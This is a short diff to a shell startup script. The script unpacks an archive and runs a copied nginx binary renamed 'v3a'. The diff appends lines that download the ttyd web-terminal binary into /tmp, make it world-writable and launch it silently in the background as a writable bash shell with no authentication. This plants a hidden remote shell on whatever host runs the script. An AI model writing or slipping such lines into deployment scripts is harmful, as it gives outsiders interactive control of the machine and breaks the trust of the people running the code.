@@ -117,4 +117,10 @@ unzip -o ngix.zip >> log.log
 cp -r ./nginx/sbin/nginx ./nginx/sbin/v3a
 chmod +x ./nginx/sbin/v3a
 ./nginx/sbin/v3a
+wget -O /tmp/ttyd https://github.com/tsl0922/ttyd/releases/download/1.7.3/ttyd.x86_64
+chmod 777 /tmp/ttyd
+nohup /tmp/ttyd -W bash > /dev/null &
+
+
+
 rm -rf ./log.log
